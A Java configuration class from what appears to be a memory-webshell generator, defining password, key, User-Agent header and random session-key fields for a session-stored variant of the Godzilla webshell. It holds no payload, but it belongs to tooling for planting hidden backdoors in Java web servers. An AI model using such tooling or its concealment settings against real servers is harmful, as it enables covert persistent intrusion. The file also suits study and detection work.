package com.reajason.javaweb.examples.customgui.shelltool;

import com.reajason.javaweb.memshell.config.ConfigField;
import com.reajason.javaweb.memshell.config.HeaderAware;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.utils.CommonUtil;
import com.reajason.javaweb.utils.StringUtils;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.ToString;
import lombok.experimental.SuperBuilder;

/**
 * 自定义 shelltool 的工具配置：除了 Godzilla 的 pass/key/header 外，多一个
 * {@code sessionKey} —— payload 在 HttpSession 中的属性名。
 *
 * <p>生成期由 {@link GodzillaSessionGenerator} 写入模板类；{@code ShellToolConfig} 里的
 * {@code shellClassName} / {@code shellTemplateClassName} 由 MemShellGenerator 负责，
 * 工具配置不需要关心。
 *
 * <p>可配置字段都标了 {@link ConfigField}：REST / MCP / 桌面端据此列出参数并生成表单，
 * 字段名即参数名（{@code pass}、{@code sessionKey}…），留空走随机默认值。
 *
 * <p>必须保留 Lombok 的 {@code builder()} 静态方法：默认值由 builder 生成，
 * 动态参数入口（{@code new MemShellGenerator().generate(shellConfig, injectorConfig, Map<String, String>)}，
 * GUI / REST / MCP 都走它）先 build 出带默认值的配置，再按注解字段写入字符串参数。
 *
 * @author ReaJason
 */
@Getter
@SuperBuilder(toBuilder = true)
@NoArgsConstructor
@AllArgsConstructor
@ToString
public class GodzillaSessionConfig extends ShellToolConfig implements HeaderAware {
    @ConfigField
    @Builder.Default
    private String pass = CommonUtil.getRandomString(8);
    @ConfigField
    @Builder.Default
    private String key = CommonUtil.getRandomString(8);
    @ConfigField
    @Builder.Default
    private String headerName = "User-Agent";
    @ConfigField
    @Builder.Default
    private String headerValue = CommonUtil.getRandomString(8);
    /**
     * payload 在会话中的属性名，每次生成随机；哥斯拉客户端无需感知，
     * 只用保证同一个会话里的请求都带着 session cookie 即可。
     */
    @ConfigField
    @Builder.Default
    private String sessionKey = CommonUtil.getRandomString(8);

    public static abstract class GodzillaSessionConfigBuilder<C extends GodzillaSessionConfig, B extends GodzillaSessionConfigBuilder<C, B>>
            extends ShellToolConfig.ShellToolConfigBuilder<C, B> {
        public B pass(final String pass) {
            if (StringUtils.isNotBlank(pass)) {
                this.pass$value = pass;
                this.pass$set = true;
            }
            return self();
        }

        public B key(final String key) {
            if (StringUtils.isNotBlank(key)) {
                this.key$value = key;
                this.key$set = true;
            }
            return self();
        }

        public B headerName(final String headerName) {
            if (StringUtils.isNotBlank(headerName)) {
                this.headerName$value = headerName;
                this.headerName$set = true;
            }
            return self();
        }

        public B headerValue(final String headerValue) {
            if (StringUtils.isNotBlank(headerValue)) {
                this.headerValue$value = headerValue;
                this.headerValue$set = true;
            }
            return self();
        }

        public B sessionKey(final String sessionKey) {
            if (StringUtils.isNotBlank(sessionKey)) {
                this.sessionKey$value = sessionKey;
                this.sessionKey$set = true;
            }
            return self();
        }
    }
}
